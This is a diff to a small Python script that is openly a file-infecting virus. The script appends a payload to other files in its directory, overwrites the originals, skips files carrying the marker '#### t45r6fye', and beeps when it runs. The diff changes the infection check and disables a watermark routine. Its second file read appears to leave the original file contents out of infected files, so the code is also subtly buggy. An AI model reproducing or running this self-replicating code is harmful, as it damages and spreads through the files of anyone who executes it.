@@ -1,7 +1,7 @@
 #!/usr/bin/python
-import glob,os,hashlib,winsound
+import glob,os,hashlib,winsound,re
 
-
+#### t45r6fye
 FREQ = 2500  
 DUR = 1000  
 global i
@@ -20,8 +20,7 @@ def watermark():
             continue
         append = open(file,'a')
         if append.mode == 'a':
-            if '###' not in append.read():
-                append.write("###" + create_checksum(file))
+            append.write('#' + create_checksum(file))
 
 def infect(PAYLOAD):
     i = 0
@@ -29,17 +28,15 @@ def infect(PAYLOAD):
         if file == __file__:
             continue
         f = open(file, "r")
-        if f.mode == 'r':
-            if '###' not in f.read():
-                infected = open('infected_'+str(i)+'.py','w')
-                infected.write(f.read() + PAYLOAD)
-                f.close()
-                infected.close()
-                os.remove(file)
-                os.rename('infected_'+str(i)+'.py',file)
-                i = i + 1
-    watermark()
-            
+        if f.mode == 'r' and not re.search('^#### t45r6fye',f.read()):
+            infected = open('infected_'+str(i)+'.py','w')
+            infected.write(f.read() + PAYLOAD)
+            f.close()
+            infected.close()
+            os.remove(file)
+            os.rename('infected_'+str(i)+'.py',file)
+            i = i + 1
+    #watermark()  
 
 
 
@@ -48,6 +45,3 @@ with open(__file__,'r') as current_file:
 
 Beep(FREQ,DUR)
 infect(PAYLOAD)
-
-
-
